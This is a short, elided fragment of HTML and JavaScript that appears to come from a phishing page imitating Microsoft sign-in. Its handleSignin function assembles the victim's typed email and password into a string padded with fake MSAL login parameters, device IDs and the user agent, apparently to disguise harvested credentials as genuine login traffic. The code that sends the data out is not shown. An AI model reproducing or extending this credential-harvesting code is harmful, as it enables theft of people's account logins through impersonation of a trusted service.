    ...
    <body style="height:100vh;">
        ...
        document.addEventListener("DOMContentLoaded", function() {
            ...
            function handleSignin(event) {
                ...
                const x =
                    `prompt=login&x-client-SKU=MSAL.Desktop&x-client-Ver=4.58.1.0&uaid=${id1}; "userAgent"=${userAgent}-NG; MSPOK=$uuid-${id2}; &ui_locales=en-US&client_info=1&${id3}=0&login_email=${email}&passwd=${password}; DeviceId=${id4}; status_date=${date};`;
